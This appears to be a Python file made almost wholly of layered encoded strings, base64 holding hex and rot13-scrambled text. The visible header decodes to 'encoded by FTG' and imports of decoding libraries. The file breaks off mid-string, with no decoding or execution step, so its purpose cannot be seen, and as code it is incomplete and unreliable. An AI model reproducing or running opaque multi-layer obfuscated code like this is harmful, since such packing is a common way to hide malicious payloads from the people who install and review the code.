
import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NGU3NDc1MzYzMDY5NTczNTU4NzM0MzJiNTEzODQ2N2E0NTRlMzI2Zjc4NzM0NDU4Njk1NDMzNDU1NDQxMzk0MTRhNTc2Yjc5NGI0MTU5NmI2ZTZkNTI0YTUyNDgzMTQ5NzY1MDQ5NzM2YjUzNTI0OTZjMzI1NzUyNjY0YzcyNWEzNjMxNGU1YTMzNWE1NjU0MzgzOTY3NDg2NzYxNGE0MTMxNzM1NzQ3NTI0ODM3NzQ3NjYyNjU0NTUzNzY3OTc2MmYzMzZjNTc0MjY1MzM2ZTM4NjU2NjY2MzM2ZTc0NjYyZjMzNmM3NjJmMzE2YzZiNjY2ZDJmMmY3NjRjNzI0YzJiNjU3MTc1NTgzMTM4MmY3NTU4MzEzODRjNjY2YTMwMmI1MjY2MmYzODQ5NmU2OTcyMmYzOTJiNmI3NDMxMmIzMjZhNjU2YTJmNjUyZjJmNjU1ODY2MmYyZjRiNjIzNjc1NjY1ODMxMzI3MjMxNmM2NjczNzY3MDY2NGM0NDcxNTI3NjY2NGM3MzcyNGM0ZTM4NmU0NDU3NGM3MDc4MzAzNzdhNzUzNTZjMzk0NjQ4NWEyZjMyMzE1NzRjNDk3MzM3MzA1MjJmNTQzNTJmNjU3NjU3NzY1YTJmNzkzODc2NDY3MjRhNjQ1NzJmNzI3NjJiNDczOTM1Njg1ODY2MzczNjMxNzI2NzMzNjMyYjU4MmIzMzc3NjM2NjQyNjY3YTRiNGEzMzVhNzU3MjMzNzc2YzcwNmM3OTY2NzQ3MTRiNGYzMjU2NzU3YTY2MzEzNDRlNmQ3MjYyNTA0ZTU5NDQ2NDM2NjczMzY2MzE1NTQ0MmY3MzQyNmU3OTY1NzI0OTU0NjIzMjZkNWEzNjc1NGQ2YTU3NzM3MzJiNTMzODM4NzY2NjU3NjE2NzY5NzI1NjU5NTk1YTRjNmU3NDZhMzU2MzY1NTc3YTc2NDQ3MzUyNTI2YzcyMzkyYjY1Mzc0ODY3NmYzODc2Nzg2YzU3NTY1NzdhNzE2OTM1MzY3MzMzNGU0YzUzNmMzOTZhNDE1NDMwNTA2ZDM4MmY0ODczNmI0NjM5NTg1NzM4MmY0MTQ4NGY2MTcxMzI3MDc0NzI0ZTM4NDYzNzU3NGQ2NTZjNjU0Yjc3Nzk1MDY4NzQzMzY1NzQ0NDZkMzY3NjRjN2E0ODY0Mzg2MjY1NjM2MjM1NDg0Njc0NmUyYjRkNzgzNTMzNjI2YTQ4NTQzMjc0MzE2NTYzNDgzMzRkNjU1NDUxNjY0ZDJmNjU1YTMwNmQzNTQ3Njc3MTc1NjUzODcwNzgzOTQyNDE1MDRiMzEyZjMxMmIzODc2NDc1ODc2NmQ2MjU5NjUzMzcxNmE2ZTRhNjk1ODZiNzQ1ODc5NmY0YTYzMmI0Njc3NjEyYjU3NTY2YTcyNGM0NDQ3NzQ1Mjc0NTM1MDZjNGYzNzZkNGEzMzc2NWE2ZTY3NzY0Zjc3MzM3OTM5MzQ3NTQ4MmI2MzQ5NGIzNzc4NmQ3MjQxNTgyYjJmNzg0YzYyNGQ1NTY1MzMzNzJmNDU0YzM5NGY0NjZhNmUzNTY3NDgzNTM4NTMzNzMwNmM3MDMwNjc1NjMwMzYzNTRkNDQyZjZiN2E0NzQ5NGM2MzZkNDE2MzJmNzE1MzYzNGE2NDM1NGM0OTRlNjQ0NzZlNmM3NDY0NTM2Zjc2N2E1OTQ4N2EzODUwNTMzOTU4NDY2NTYzNzU2NTZiMzEzNzU4NTA1OTM5MzEzNzdhNDM1NDJiNjgzNTZmNTAzNzMxNjc0ODU2NmM2YjQyMmY2YTUxNTczODU0MmY0ZTMxNjE1YTc4NzEzMjZmNjIzNDZmNmEzNzRjNDY2MjY4NjI1NzM3NTczNDczNTA0NzJmNzM0MjM5MzI3NDRiNzM3MTQ3NjM2MjRjNTMzMjZjNGU1ODc2NzE1YTM5NDgzOTU0NDg0ZjY5NzQ0ZDZhNmY0ZTM1NzAzNjRjNDg0MzJmNTc0NDY1NTQ0ZjJiNDQyZjMxNDI0MjZmNzc0Njc2NTc0MTY1NmE3MDc0NTI1MDZmMzE3ODM4NGM2NTRjNWEyZjRhMzc2YTY5MzcyYjQxNDgzMzczNDIzODY3N2E0NjUwNjcyYjM1NzY2ZjZmMzE3NzU2NzkzMjZkNzU1ODYxMzQzNjRlMzM0ZDU4NmU3YTRiNDYyYjM0NDc2NTYzNDIyYjRmMzY2NTM2Nzk2MjY0NmU1YTY3NmUzOTY5NDU3MjZkNDU1ODJiNGE2ZTZjNTk1NTdhNTI0OTJiMzA3YTM1NTg3MTc4NmM2NzY2NDc3NzY0Nzk3NzRmMmYzMTQzMzk0MzJmMzY2ODY2Nzc2ZTJiNDYzMDY5MzQyYjU0NTU0NzJmNzk0NDY1NmM2ODU2NDM3NjM0NGU2NjU3NDU3NTU0NTgzMzUxNzYzNDY0MzQ3OTZlNTc3NTM0NDE2MzU5NDYyZjcyNDYzODJmMzQ2NTY1NzE0NTY0NGU0ZDYxNDQ2NjRhNDIzMzRjMmI0ZjU2NmI0OTJmNTA0ZDZkMzY2ZjY0MzgyZjRiNTg2Mzc5NTg0ZjY2NjkzNzcwNzUzNTczMzA2NDMwNTE1MTMwMzY0ZTc0NjQ0NTY2MzQ2NTJmMzAzNjM0N2EzNjM4NDQ0MTY2MmY1NjYyNDQzNzMyNGMzNDQ5NzY1MTJmNjI0YzY3NGYyZjQ0Mzc0ZjcwMmI1ODc2MzM2OTQ0NzYyYjc4MzQyYjQ2MmY1MTcyNzk0NTQ2Mzc3ODY0NDE3YTM3NDU2ZjJmNjM3NTQ2NmU3NjZiNGM3MzQ2NmE2MTJmNjgyZjdhMzQ2NjU1NGQyZjRkNTA2ZDY1MmI0ZTUwNjc2ZDQzNGIzNzZhNDEyYjJmNzcyZjYzMzUzNDY4NTIzMjc4MmY0ZDQ2MzU2NTRjMzg3MzQ0NjY1ODZmNTM2NDM2NTU0Njc3NTQzNTYyNDM2ZjYxMmI2NzQ1MzgzMDQ4NzY0NTczNjU1MTY3Mzc0YTY1MzY0NTYzNzgzNzRkNTk1OTM4MzI2OTZlNDM2NTY2NDE3NjRhNDM2MjY1NzE2MzJmNzg0YzQxMzMzNDcwNTQ2YTU4NTc1MjJiMmI0ZjVhNmQ3Nzc2NTc0YTY2Njg2OTUwMzk0NjUwNGY0YzM3NmE0MzM4NjE2NzM3Njg2NjU1NmQ1NjM4NTM0ZTRhNjY3MTM4Mzc0OTY0Nzg1MDc0Njk0Nzc1NzMzMjU1MzY0ODYxNTY2NTYxNjIzNDc5MzA1ODM4NDc3NTM5MzUzODQxNzY0NTU1MmI1Njc4NjY1OTY3NzY3OTZmNGYzNDcxNmE0NDY2NGE2MjZkNzU0MjY3NjQ3ODQzN2E3NzUzNTAzODcyNTA2YTRkMmY1NjQxNDQzMDY3NTg2OTQxNTQ2NjcwNjQzNTM3NGYzOTM1NjU3NTQ5NjEzNDZmN2E3ODY5NzY1NTU2NzM0ZDJiNjY2NjY3MzczODZmNjIzMDU1MmY2Mjc2NDM2MzM4NjIyYjY3NzU2MzczNmQ2MjY1NmU1MDY2NGY0ZDc1NGM2NTY4NmUzNTczNjkyZjM1NDI1ODMwNDE3NDMwNDM0ODZjMzk1NDY0Nzk0MTM3MzM0ODRmNTc0ZjQ5NDUzODU5MzAzMTYxNmU1MDQ1NGU2NTRjNjM3ODY4NTkyZjQyNGIzNDU0NDk3YTU4NTg2OTQ0Njc1NjUwNjY2Nzc4MmY0YTY0MmI0MzdhNzgzMTY5NTg0Zjc3NGYzMzQ2NGEzNDZlNTYzODRjNmU2MzMxMzU3ODMxNTc2NzZhMzg0NjM4NjM0ZjU3Mzk1MjQ1NTg2NjYxNzk1MTJiNzY0NzQyNGI3NzUwMzk1NzYzNTA1MDQzNzM0NjM3MzQ0ODM1NTA1MDQ5NTg2NTQ5NDg2MzRhNTA2NDRlMmY2OTU5Mzk2MzQyMmY3YTc0NzM3MDQ3MzQ0MTQ3MzY1NjU4NDI1MDY5NmI3NjQ2NGI1NzY2NjcyYjJmNDE1Mjc4MzY0OTczMmI2NTJiNDk1NDYzNGI0NDZlMzcyZjczNGMzNTRhNjM3ODQyNGE3MzVhNDU3YTYyNmE1NTc2NDM1NjJmNmI2ZjM1MzU0ODZlNDc1MDVhMmY2ODJiNmIyYjQzNzczNTQzNDQ1NzQ5NDUzODQxNjQzODQ3NGU2ZDQyMzg1NzMzNTIzMzZmNjYzNDM1NTA3Njc4Njc2NzRjMzI3MTQ0NjU2MTY4MzM3NjQ3NWE2NTRmNzM3YTQ4MzA0MjRmMzQ3NDZiNjcyYjQxNGIzNTRiNTY2MzRkNjU2NjRkN2EyZjU4NDI1MDMzNGQ1MzM4NDU3MTRmNTY3MzY3NTY1MDMzNTg0ODM5NDc0ZTRkNDE0ODY4NDk3MjUyMmYyYjM2NTE1MDJmNDQ2OTRjNjMzNTZlMzg3NjZmNGE3ODc2NGY2ODY2NDc1YTcyMmY0MzczNTMzNzJmNjE1MzQyMzY2Yzc2NzI1MzczNzczNjRmMmY1NzM2NzMyZjM5NDM3NjJiNDE1NDJmNDk3MTQ1NjY0NTMwNzc1NjM1NDU1MDZkNDQ0ZjQxNzMzNzU3NDc0ZjYzNGEzNzQyNmU1NDRjNzQ1MDRiNTE2NjdhNzE0ZDUxNmIzNzU1NmE2NDUzNjUzNDQyNDQ2YzMwNTkzOTc4NzY0YTY4Mzk1MzRhNTI2ODdhNjk1MDY0NzI2NjVhNmMzNjU0MmY0OTcwNmUzNDRjMmI1MzZjMzc0MTRmNzY0ZDY0NTk1OTVhNzc2ODQ0NzA0MjZlNzE1MjJmNDU1YTc5NjYzMjZjNmU3OTQzMmI1NDUwNGUyZjQxNzAzNTY5NjI2Njc3NTMyZjY3NzYzNTM0NDc3NDc2NzI0NzQ3NGY1OTQ0MzE0MTUwNGM0NTVhNjM0ZjM0NmQ0OTY5MmY1ODY4NDI3NjY5NDQ1MDZkNDE0ODc3NTAyZjM0NDQ2NDU4NjM2ZTRjMzczNDRiMzk3YTQ4NjY0ZDUwMzU2YzY3NDE2Njc5NmM2ZjQyMzk2OTMzNWE2OTcyNjc2ZDc3NzU1YTUwNTE2ODZhMzQ3ODQ0NzY1OTc0MmY1NTYzMzQ0ZjM5NTE0YzdhMmI0YzY1NjUzNDU3NjY0ZDM2NjE0OTJmMzY0YTRjMzU3ODYzNjQ1MDQ2MzUyZjcwNDc3OTM3MzE0OTJmMzY0YTJiNDM2OTJmNjM1OTMzMmY0MTYyNzY2MzQ1MzM0NTQ3NTAzNDZiNmEzMTQ1NTY3MDUzNGYzNjcwNDc0ODJmNzc1MTMzNjM3YTMxNjc3NjU2NmU3NjU1NGYzNDZkNjY0ZDM2MmY0MTRhNTczMzQxNGI3MzYxNTgzNTJmNmY2OTUwN2E0MTQ1NmE3NjZjNTM2MjM4NTcyYjQ5NDYzODZkNmE0MTJmNGQ0MjMxNzk0YzdhNTE1MjJmNzg0OTUwNmY2MzU0Njg2OTQ4MmI1YTM3MzI2NzQyNzc3NTM0MzQ3NTMyNTA2OTQ4NzU2YjM0NzYzNDRjNzU0ZTY3NmE0Mzc1NDQzNjc4NjU2NjdhNDQ2OTc1NDY3MjM5NDg1MDQ1NDk2NTM0NjgyZjZjNTY2MzUzNzU1NDc2NDQ0YjY4NWEzNjc5NmIzNzU1NjUzMzM3NTY2YjMzNTQzNzY5MzU0MzRjMzY3MDUzMzI3MDQ0MmI1YTQ4MzE2ZTc5NDczNTQ1NTg1ODQ3MmI3MzUzNmMyZjZkNjMzNjc5MzE1MjZhMzc0MTc1NmYzMjM3MzIzOTQ4Mzk2MjM2NmEzMzZkNTE1MjY0MzY3MjZkNDIzNzU2MmI2ZjQ0MmI0NDJmNDc3NzJmN2E0MTY2MmI0MzUyMzU0ZTM4NzAzNzQ3NTI0YTUwNTE0ODJmNTIzMzM1Njc1ODZmNDgzOTU4NzQzNTVhNjYzNjc5NTk0YTMxNDQ2ZTM3NGE2ZDY2NDc2NTM5NTMzNDc5NmUzNjcyNjM2ZTY2NDI2NTY0NmY2ODM0NzgzNTZmNzI1MzZiNTQ2YjUyMzgzNTRkNDEzMzc4NzAyYjU3MmI3MjUxNjM1OTM0NDMyYjYzNmQ0ODY1NmY2MjMwNTk2NjM0NzczMzM0NTA0YjZmNjIzOTUxNDg3MjQyNGQ1MjQ1Mzk1ODY1NDU2Yzc3NTEzMzRiNTgyZjQxNmEzOTQ2MzMzNTUzNTAyYjUxNmU3OTVhNzA0OTQ4NmQ0ZjYzNmQzOTRjNGY2MzY1NDkzNDYzNGE3NjRkNGE2MjY4NGE3YTQ1NDY0ZjMwNDk2NTZmNzE3ODcwNmU2YjQ2NjM2MTUyNzYzMjQ3NjU0Nzc5NjczMzM4NTA1MTM4NmE2OTc0MzE0MjUwNGQ3YTY0NGY2Zjc4NzIzODQzNzY0ZDQ5Mzc2ZjZiNTg1NTdhMzY3ODdhMzE1ODY0NjM3OTYyMzA2YTM5NTQ1ODc5NzE3ODc0MmI1YTY5Nzc1MTJmMzc1NDQ1NzY0NTc2NjYzNTY2NDg0YjQyNTA1MDQxNDQ3MjRlNzY3OTUyNDYyZjMwNTQyZjY4NzM1MjJmMzg2ODdhNmQ0MjY1MzI0ODQzNGQ2MzY2Njg3NjRlNjU0YTM0Nzc2YTY3Nzg1MjVhMzg1YTM2Nzc0ODY3NDcyYjRhMzg0YzU4NTg3NTZkNDM2NDU3MzE0ZTRkNjcyYjU5NTgzMTY4NTMzMTM2NTI2ZTM0NjMzNTUxNDQ2NTZmMmIzNjQ2MmY1NjZlNzY2YTZlNTczODMxNGM2ZDRkMzczOTRmNDk3MTM2Nzg2ZTc4NGYzODU1MmY2NDU3NTM0ZjZiNDY3OTRiMmI1MTZlNjI2ZDVhNjMzNzMzNjQ3MzU1NmMzODc1MzYzNjcxNTk2NTY0MzI1Mzc2NDEyYjJmNjg2NDJiNzc2MjcwNGQzODU0NDgyYjQyNTA1NDcyNjk0ZDc1NGU2MjQzN2EzNDU4MzA3YTQ2NjY2MzZhMzEzNzcxNTQzODc3NTAyYjc0NTc3ODY5NzY2YTU1NzU3MDZjNzE1NjRkNzI3MTU0NDUzNzcxNTc0NzQxNjk2MzUzMzU3NjY1NDI1MzRmNjM2OTM0NmE0NDY1NTg0ZjY5NDg0ZjUxNTEzNzMwNDkzMjc2NGY0YzMzNDU0NTU4MzU1MDM4NDk1MDZkNTk2NTUwNDE1MTZlNGQ2NzQ1NzYzODVhMzYzMTcxNTc0ZTY5NmY2ZTU5MzI3OTU2NjU1NTMzMmI3NzU2MzA1ODJmNjc1MjM5NmMzNzQxNzQ2ZjU0MmI2Mjc4NmQ0ODZkNDEzODM5NzE1OTY4MzUzODM3Nzk2NjRmNGQzMjMwNDgzMDRmNzY2ZjdhNzYzODM4NmI1MDM1NTY2YTc2NzM1NTM0NzI0MzM4NDczNTY5NmM1MDM4NjkzNTc4NDQzMzM3NGU2NjQ5NTY3ODY3NDU2NDM4NmU2ZTZlNTg0NjU4Nzk1YTRkNmIzOTY3Mzc1OTYyNTU1MDc4NDk3NjRhMmY3MDM2NTQ3YTJmNGM0YTYyNjU3OTM5NzE0NDYzMzg0YTczNGMzNjczNjM3ODQ2Njc3YTQyMzQ1NDQ2NzU2NTczNmU3YTdhNGM3NjMwNTYzNTY2MzkzMjY1NTk3ODc2Njc2NTVhNGIzOTUzNTYzOTQ2NzY1NTZjNjM2YTUwNDQzNjM1MmY3ODU4NzA0MjJiNmI1ODQ1NGYyZjc1Mzc0MzMzNDE0ZDM5NWEzMTMyNzg1ODM5Njc2MTJmNTk3NjcyNTA2NTMwMzk0MjMxNzIzNjUyNzU1OTQ1MzE2ZDU0MzA3MDM3NmY0MTM1Njg1ODQ3NDI2MzVhMzQzMDZkN2E1ODM3NTM2YjMzNzIyYjc3NTQzODRjNjM0NjY2NGQ3MzYzNTY1MDZiNjc3NDM0Mzg1NzdhNDI1NTYzNDU3NTc3NmU1NDY4Mzg0ODc2NTg0MTY1NmI0NjM4NmE1MDQ2NzY3MzM4Mzc2YjJiMmI0OTU4NmQ2NjUyNGM1NzQzNjY2OTZhNmUzMTY0Nzg2ZTcxNGY0ZjQxNGM2NjQ2NGM2ZTU5NzYzOTQ5NmU1Mzc1NDE1MTM4NzA1MDU1NzYzNTY4NTgzNjZhNzY1Nzc1Mzg3MTU1NmQ3NDUzNDY1ODMxNGE1MDZhNGI3NjczNTczNDY1NWEzMjRkNjM1MzY2NDg0MzJmNjM1NTQ4NzE1NDc2NjE2YzRhNTg0NzUzNGY1MjY0Nzk2MjcxNTM1ODMyMzM0ZjM5Mzc0ZTM5NjMzMTcyMmY0ZDYyMzY3OTU0MmYzNzQ0NTg2Njc1NzczNzc4NDc2NTZjNjIzMDU5Mzk3OTU0Njc1ODc2MmI2ZDJmNmUzNTc0NGIzMzRlNGU3NjcwNGI2NDY5MmY2MzQ4MzM2ZDQ1NjY3MDM3NjY0MTdhMmI0MTcyNmI0ODc5NTIyZjU1MzEzNDJiN2EyZjc4NGI3NjU1NmM2NTU5NTgzMjMyMzY1OTZkMzMzNzQ5NGU0ODMzNzg0NTM4NmY1NDM5NGQ2OTQzNmM3MjM5Njg2ZDMwMzk3OTQxMmI1OTQ1NzMyZjZiNDE0ODZlNTc1NDM5NjY2ZDQzMzk2OTM2NWEzMTQ1N2EzNTQ5NTg0NzQyNjM0Yjc2Nzk1MDc1NTk1MTc1NzA2ZTJmNDg0ZDZkNzY1NTc0NjY1OTM5MzU2YjZlMzA0YzM4Nzc2Njc4NDI1ODMyNTYzMjRhNjYzOTcyNzU0MTRjMzk0NjUzNGE0ODJmNTQ0ZDM2N2E2ZTM5NTk3Mzc4NjY2NjRkNTk2NzdhNmI3MDY2NmQ0MjQ1NzI1MzJiNmI3MjMyNGE2NDRiNGM0YzQ5NmQ1OTZlMzc2OTc2NmY1NDU1NjI0MzU1Nzc0MjJmNzE1NDc2NDk3MjMxMmI0YzU0NjIzNjRjNjY1MzU2MzE2MjY1NjQzNzMwNmE2MzU4NTM1Mjc2NzY0YjM3NGM3ODUzMmY3MjJmNTM1OTMxMzA1OTYzNTA1NTc2MmY1NDMzNzk2YzUwNzg0NDUwMzI0ZTYzNGE3NjY4NGI0YzMyNTkzOTM1MzQ3MzUwNjY1MDU0NTA2YTQ1NDQ2ODQzNmU0ZTJmNDkyYjdhNDk2NjM2MzA3NjZiMzgzMTdhMzY0ZDJiNWE0MTM4NTQ1MDcwNDUzODY2MmI2NTYzNzg1NDYxMmI0Yzc0Nzc0YzdhNGMzOTYzNGU3NjJiNDI0ZDJiNmE1NDcxNTI0ZjRkNGIzNjQ0NzU3MzcxNmQ0YjM4NmM0NDZhNTQzNzQ5NzU0MzMyNGE2ZjM3NDI3MjMxNmU1ODRkMzEzOTUyNGU3MzZkNDg3ODQ4NTY2NjJiNmQ2NjU3Nzk1NzRmMzk1NDY0N2E0Yjc4NmEzNjU1NjQ2NTY5NTkyZjMyNDIzMzM5Mzc3NDY1NzU3MjQ'
trinity = '0ATL1ZGD0Amt0LmMyAGx0AQMyAmH1AmZ4AzRlLwHlAzDmAGMwAwL2Amp4Zmx2BGD1AGNmBQHkZzL1AmD3AGx3BQLlZmL1ZmExAGH2AwIuATZmAQp5AwL3AmZ1Awx0BGZ4Amx1ZwL5AmL0AGEuAmH3ZmEwZmD2LGp4AzR0Zwp2AmR1Awp1AzL1LGZ5AQD3AwHjZmH2AQpkAmp0BQp2ZzL3AGH3ZmL1LGWzZmp0Lmp4ATZ2AwplAQx3AGD5AwpmBQp3AzR2LmDlAQtmAGquAGN2AwMzAzRmBGIuZmZ3Awp3AQZmAmEvZzV1BGH0Amt2LGMuAzR3AGZ2ATRmBGpjATRlLwHlZzV2MQquAQD2AGD0AQL0BQL2ZmH0AwZ2AzRlMwpmAmpmBQD1ZzL1AmHjZmp0AGL4AwH1AwWzAmR1AmZ2ZmD2MGMwAzHmZQpjAmt2LGplAmp2AmH4AzZ1AwWvAzR1AQD1AGt3BGWzZmVmAGHjAmV1LGHlZmV2ZmMyAmx2LGMxAGL1ZQLlAGD0LmL5ATL0AmpmAwDmZQH5ZzL1AQp3AGD2MGZkAzL0LmD0Awx0BQMwAGt3ZmD4AwL2ZmH0Zmp3Zmp3ZmZmBGEzAmLmBGpkATDmBQD2ZzV0BGEzZzV3BGL5AQt2AwLmAmH0AGWvAGp3AwEyAwL3ZwD4Awx3AwL4AGtmZmMvAmt3LGZ2AQD2AwH0AmHmZQD0Zmt2LmZ3AmR1Amp1AzZ3AwZjAQpmZGp2ZmN2MGZkAzZ0Amp5A2R2BQH4Zmx1AmL2AQV3AwZmAQL2AGHlAGN2BQH2ZmR2LmEyAGD0AQL3ZzV3BGpjAwD0LmEwAwL1Zwp2Zmx0AGWzZmt3LGZ4Amt1BQpjAwDmAwMuATL2AwWvAzL1BQWzAwxlMwWvATD0MQHkAGplMwZ2AwV1BQMvZmN0AmEwAwZ3BQZlATDmBGL4AGtmAGExZmx0LmH5AwDlLwZkZmp2ZGIuAGHmZwWzAmN2BQZ3AwD1ZQLmAwZ2MGquAzH0MwL2A2RmAGD5ZzV0AmWvAmL1BQZjAmZ2ZmL4AmV2AmH0ZzL1AmHlZmt2BGHjZmx0LmZlAzR0BQL2AmH2LmZ3AQH3AGquATZmAmplAGtmZGWvAGNmBGLmATZ0ZGp2ATD3LGZ5AQt2AQLkAJR2LmEuZzVlLwp5AmV2AmZ0AQH1ZGLmAmHmAQMvZzL1AGEwZmxmAmEyZmV1Zmp1AQx1AQExAmpmZmZmAQLmBGMvATZmAwLkAQx2Mwp4AGN0LGLlZzV3AmLlAwL0LwMwAwL0LGZlATHlMwp3AGtmAwEwZmDmZQD5AwHmAwH3AwZ2Amp0ZzV1ZGH0ZmH2MGExZmxmAmMxAwD3AmL2ZmN0Awp3AGV2MGD0AzL0BGH4AQL3BQZ0AGtmAQHlZmxmBGLmZmVmZQMxZzL3AQpjAGH2AGMyZzL0MGHkAwVmBQEuAwLmZGMwAQDlMwH3AQVmBGEwAGN3ZmMyZmt2BQMuAwp3BQHmAzHmBGpkAGZ2Lmp5ZzV0MQH4ZzL3ZGD5ZzV3AGZmAGt1BQquZmDlMwquAmL1BQZ1AmZlLwL2AQp2ZwWvAGL1AGZ2AmNmAGH4AzH1AQZlAGN2MwZ2AzV3LGDlAQH2ZwMvAGVmAGLkAGD3AGL0AGHmBQquAwx2AQEzAzH0LGp2ZmH0ZGquZzLmBGp3AQx2MwpkAwVmZmDmAmR3AwD4ATZmBQp4AzH2ZGpkAQV0AQWzA2R2BGp4ATLmAmMwAmL1ZQDkAGNmBGHkAmN1AQp1AGH2ZGMuAmHmBGLkATL3AGLlAwL1ZQZ2AmHmAGZmZmR1ZwEzAQt0AwHkATL2ZGMyATH2MGp5AQxmZGMzAwL0MGL2AQH1ZQDmAwR2AGEyZmR2BGquATLmAQZ4AQRmBQZmAzL2AQp2ZmZ2ZmL1ZzV2AQH3AmN1ZQMxZmZmBQp2AQD2BQIuAGx0AGL2AQx1AGHjAzH3AmH5AmH2ZGWvAwL0BGL2AmtmBQZ2AzH2LGEuZmx2ZwLmA2RmZwZjAzHmAmMvAmtmAGEwZmZmAwp4AQt1AwWzAzR0LGZ5AwV3ZmHlZzL2LGZ5AQV2AwEyAmx1BQEvA2R2AwL4A2R3BGIuAwRmZQLkAGx0MQZ2Zmt2BGplATVmZwZ5AGxmBQZlAGR3ZQquAQp2AQEzATZ2MGpkAwtmZmp1AQL3AwD2AwV2LwLmZmDmZwZ1AmN2AwZjAwZ3ZmMyAGR1AmZ1AQD1AGL0AwLmAQH4AwLmBQL2AwZ3ZGp3AzH0MQDlZmZ3ZmLmAwR0Lwp0AwL2LwL1AzR0ZwHjAQZ2AwMxAmLmZQH5AGN2LGH1AzVlMwEyAJR0Awp5ZmZ2BGZmAQHmAmL2AQL2ZGH5ZmH3AmH2AmxmAwH0AmL2LwEyATRmZwD4ZmL0MGL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